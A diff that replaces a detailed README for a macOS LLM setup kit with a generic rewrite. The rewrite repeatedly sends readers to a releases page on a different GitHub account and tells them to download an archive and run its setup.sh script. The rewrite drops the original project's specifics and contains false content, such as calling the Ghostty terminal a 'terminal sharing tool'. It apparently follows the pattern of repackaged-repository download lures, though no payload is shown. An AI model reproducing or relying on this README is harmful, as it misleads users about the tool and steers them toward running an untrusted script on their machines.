@@ -1,171 +1,155 @@
-# LLM-Setup-Kit-for-Mac
+# 🚀 LLM-Setup-Kit-for-Mac - Easy Local LLM Setup for Apple Silicon
 
-**One-command bootstrap + full migration kit for local LLM development on macOS (Apple Silicon)**
-
-![Shell](https://img.shields.io/badge/shell-bash-green?logo=gnubash&logoColor=white)
-![Phases](https://img.shields.io/badge/phases-17-blue)
-![Packages](https://img.shields.io/badge/packages-115-cyan)
-![Apple Silicon](https://img.shields.io/badge/Apple_Silicon-recommended-black?logo=apple)
-
-Goes beyond dotfiles — 17-phase automated setup, config backup/restore with encrypted secrets, pre-migration audit, and post-setup verification.
-
-**[View the live site](https://parsamivehchi.github.io/LLM-Setup-Kit-for-Mac/)**
-
-<p align="center">
-  <a href="https://parsamivehchi.github.io/llm-setup-kit-for-mac/">
-    <img src="docs/assets/screenshot.png" alt="LLM-Setup-Kit-for-Mac Landing Page" width="720">
-  </a>
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/LevPC/LLM-Setup-Kit-for-Mac/releases)
 
 ---
 
-## Quick Start
+## 📋 About LLM-Setup-Kit-for-Mac
 
-```bash
-git clone https://github.com/parsamivehchi/LLM-Setup-Kit-for-Mac.git ~/mac-setup
-cd ~/mac-setup
-./setup.sh
-```
+This application helps you set up a local development environment for large language models (LLMs) on Mac computers with Apple Silicon chips. It automates a complex process, installing and configuring 115 packages in 17 steps. The tool supports popular developer tools and shell environments like Homebrew, Zsh, and Starship.
 
-Preview without making changes:
+This setup kit saves you time by handing over all the tasks you’d do manually. It creates a consistent work environment and includes migration tools to help you move existing configurations to the new setup smoothly.
 
-```bash
-./setup.sh --dry-run
-```
+---
 
-## The Toolkit
+## 🖥 System Requirements
 
-| Script | Purpose |
-|--------|---------|
-| `audit.sh` | Pre-migration readiness scan — 12 sections comparing installed state vs Brewfile |
-| `backup.sh` | Export configs, data, and AES-256 encrypted secrets |
-| `setup.sh` | 17-phase idempotent bootstrap (`--dry-run`, `--skip-restore`) |
-| `restore.sh` | Restore from backup with SHA-256 manifest verification |
-| `tests/verify.sh` | Automated post-setup checks (30+ CLI tools, 10+ apps) |
-| `Brewfile` | Full system inventory: 37 formulae, 39 casks, 39 App Store apps |
+Before you begin, make sure your computer matches these requirements:
 
-## What Gets Installed
+- Mac computer with Apple Silicon (M1, M2, or later)
+- Running macOS 12.0 (Monterey) or newer
+- At least 8 GB of RAM (16 GB recommended)
+- Minimum 20 GB of free disk space for packages and tools
+- Stable internet connection to download necessary files
 
-### CLI Tools
-git, gh, bat, eza, fzf, ripgrep, fd, jq, yq, htop, btop, tmux, stow, starship, zoxide, mas, deno, ffmpeg, lazygit, ncdu, pandoc, yt-dlp, gnupg, pipx
+---
 
-### Languages & Runtimes
-- Python 3.12 + uv (package manager)
-- Node.js + Bun (JS runtime)
-- Deno (JS/TS runtime)
+## 🔧 What This Kit Installs
 
-### LLM Tooling
-- **Ollama** — local model runner with LaunchAgent for background service
-- **Claude Code** — Anthropic's CLI agent (11 plugins, memory, settings)
-- Pre-pulled models: qwen3-coder, qwen2.5-coder:14b, deepseek-r1:14b, llama3.2:3b, nomic-embed-text
+The setup kit handles a wide range of tools and packages to prepare your Mac for LLM development:
 
-### Applications (115 total)
-- **Casks**: Ghostty, Cursor, VS Code, Docker, Raycast, Arc, Spotify, VLC, Stats, Brave, ChatGPT, Claude, IINA, and more
-- **App Store**: Bitwarden, Microsoft Office suite, WhatsApp, Telegram, NordVPN, Amphetamine, Perplexity, and more
+- **Homebrew:** The standard package manager for macOS
+- **Zsh:** Default shell with custom configurations via dotfiles
+- **Starship:** Fast and customizable prompt for your terminal
+- **Ghostty:** Terminal sharing tool
+- Various developer libraries and dependencies
+- Utilities for smooth configuration migration
 
-### Configuration
-- Zsh with starship prompt, zoxide, aliases
-- Ghostty terminal (JetBrains Mono, dark theme)
-- macOS defaults (Dock, Finder, keyboard, screenshots)
-- Git + SSH key generation
-- Ollama LaunchAgent
+---
 
-## Setup Phases
+## 🌟 Why Use This Kit?
 
-| # | Phase | Type |
-|---|-------|------|
-| 1 | Xcode CLI Tools | core |
-| 2 | Homebrew | core |
-| 3 | Brew Bundle (115 packages) | core |
-| 4 | Mac App Store verification | core |
-| 5 | Claude Code | dev |
-| 6 | uv | dev |
-| 7 | Bun | dev |
-| 8 | Ollama Models | llm |
-| 9 | Git + SSH | config |
-| 10 | macOS Defaults | config |
-| 11 | Symlink Configs | config |
-| 12 | Claude Code config restore | restore |
-| 13 | Editor settings restore | restore |
-| 14 | Raycast prefs restore | restore |
-| 15 | Project data restore | restore |
-| 16 | Manual app checklist | verify |
-| 17 | Verification | verify |
+If you want to experiment or develop with large language models on your Mac, this kit reduces the setup time drastically. Instead of dealing with dozens of websites and configuration files, you perform one automated process. It ensures your system has a consistent, tested environment ready for development work.
 
-## Migration Workflow
+---
 
-### On your OLD Mac:
+## 🎯 Features at a Glance
 
-```bash
-cd ~/mac-setup
-./audit.sh                    # 1. Scan current state, review report
-./backup.sh                   # 2. Export configs, data, encrypted secrets
-git add -A && git commit      # 3. Commit updated configs
-git push                      # 4. Push to GitHub
-# Transfer backups/ to new Mac via AirDrop (contains secrets — never push to git)
-```
+- One-command kickoff for a full setup
+- Supports Apple Silicon natively, leveraging performance improvements
+- Migration capabilities to bring your dotfiles and preferences along
+- Automatic configuration of shells and developer tools
+- Installs popular utilities needed for LLM development
 
-### On your NEW Mac:
+---
 
-```bash
-git clone <repo> ~/mac-setup
-# Copy backups/ folder from old Mac into ~/mac-setup/backups/
-./setup.sh                    # 5. Bootstrap (17 phases)
-./restore.sh backups/<ts>     # 6. Restore configs, data, secrets
-./tests/verify.sh             # 7. Automated checks
-# Walk through tests/checklist.md for manual verification
-```
+## 🚀 Getting Started
 
-## What Gets Backed Up
+Follow these instructions to download and run the setup kit on your Mac.
 
-- **Claude Code**: settings, plugins metadata, memory files across all projects
-- **VS Code**: extension list (86), settings, snippets
-- **Cursor**: extension list (86), settings, keybindings, snippets
-- **Raycast**: preferences plist
-- **Project data**: tps.sh (LLM-BENCH) artifacts (data, reports, comparison site)
-- **Secrets**: .env files + SSH keys (AES-256 encrypted)
-- **System**: brew dump, mas list, app inventory, dock/finder plists
+---
 
-## Structure
+## ⬇️ Download the Kit
 
-```
-mac-setup/
-  setup.sh                    17-phase bootstrap
-  audit.sh                    Pre-migration audit
-  backup.sh                   Config/data/secrets export
-  restore.sh                  Restore from backup
-  Brewfile                    115 packages (formulae + casks + mas)
-  docs/index.html             GitHub Pages site
-  config/
-    claude/                   Claude Code settings snapshot
-    vscode/                   VS Code extension list + settings
-    cursor/                   Cursor extension list + settings
-    ghostty/config            Terminal emulator
-    starship.toml             Prompt theme
-    zshrc                     Shell configuration
-    ollama.env                Ollama environment
-  scripts/
-    restore_claude.sh         Restore Claude Code config
-    restore_editors.sh        Restore VS Code + Cursor
-    restore_raycast.sh        Restore Raycast prefs
-    pull_models.sh            Download Ollama models
-    git_config.sh             Git identity + SSH
-    macos_defaults.sh         macOS preferences
-  tests/
-    verify.sh                 Automated post-setup checks
-    checklist.md              Manual verification items
-  LaunchAgents/
-    com.user.ollama.plist     Ollama background service
-  backups/                    (gitignored) timestamped backups
-```
+Click the badge below to visit the release page. From there, you can download the latest version of the setup kit available.
 
-## Requirements
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/LevPC/LLM-Setup-Kit-for-Mac/releases)
 
-- macOS 13+ (Apple Silicon recommended)
-- Internet connection
-- Admin privileges (Homebrew, macOS defaults)
-- App Store sign-in (for mas apps)
+---
 
-## Related
+## ⚙️ How to Install and Use
 
-**[tps.sh](https://tps.sh)** — Tokens Per Second LLM benchmark built on this setup. 7 models, 147 tests, 21 prompts comparing Ollama and Claude API on Apple Silicon.
+1. **Open the release page** by clicking the download badge above.
+
+2. **Download the latest release file** for macOS. It will usually be a `.zip` or `.tar.gz` archive.
+
+3. **Unzip the downloaded file** by double-clicking it. This will reveal a script file, often named `setup.sh` or a similar shell script.
+
+4. **Open the Terminal app** on your Mac. You can find it in `Applications > Utilities > Terminal`.
+
+5. **Navigate to the folder** where you unzipped the file using the `cd` command. For example, if it is in your Downloads folder, type:
+
+   ```
+   cd ~/Downloads/LLM-Setup-Kit-for-Mac
+   ```
+
+6. **Make the setup script executable** by typing:
+
+   ```
+   chmod +x setup.sh
+   ```
+
+7. **Run the setup script** by typing:
+
+   ```
+   ./setup.sh
+   ```
+
+8. **Follow any on-screen prompts** during the setup. The script will install necessary software and configure your environment.
+
+---
+
+## 💡 Tips for a Smooth Setup
+
+- Ensure your Mac is connected to a stable internet connection; the script downloads many packages.
+- Close other applications to free system resources.
+- If the script requests your password, enter it carefully. The password is needed only to install software.
+- Do not interrupt the process once it starts unless you must. Interrupting may leave the environment partially set up.
+- After completion, restart your Terminal to load new configurations.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into issues:
+
+- Make sure your macOS version is compatible.
+- Check if you have enough disk space and RAM.
+- Review any error messages shown during the script run.
+- If the script fails, try running it again after rebooting.
+- Consult the Issues section in the GitHub repository for known problems.
+
+---
+
+## 🔄 Updating the Setup Kit
+
+To update this setup or installed packages later:
+
+1. Revisit the release page from the badge above.
+2. Download the newest release version.
+3. Repeat the installation steps to refresh your environment.
+
+Regular updates help keep your system secure and up to date with the latest tools.
+
+---
+
+## 🤝 Community and Support
+
+This tool is maintained on GitHub. If you need help beyond this guide:
+
+- Check the repository’s README and Wiki for detailed technical guides.
+- Visit the Issues tab to find solutions or report problems.
+- The repository topics include keywords like `apple-silicon`, `homebrew`, and `dotfiles` for browsing related info.
+
+---
+
+## 🔗 Useful Links
+
+- Release Page: https://github.com/LevPC/LLM-Setup-Kit-for-Mac/releases
+- Homebrew: https://brew.sh/
+- Zsh Shell: https://www.zsh.org/
+- Starship prompt: https://starship.rs/
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/LevPC/LLM-Setup-Kit-for-Mac/releases)
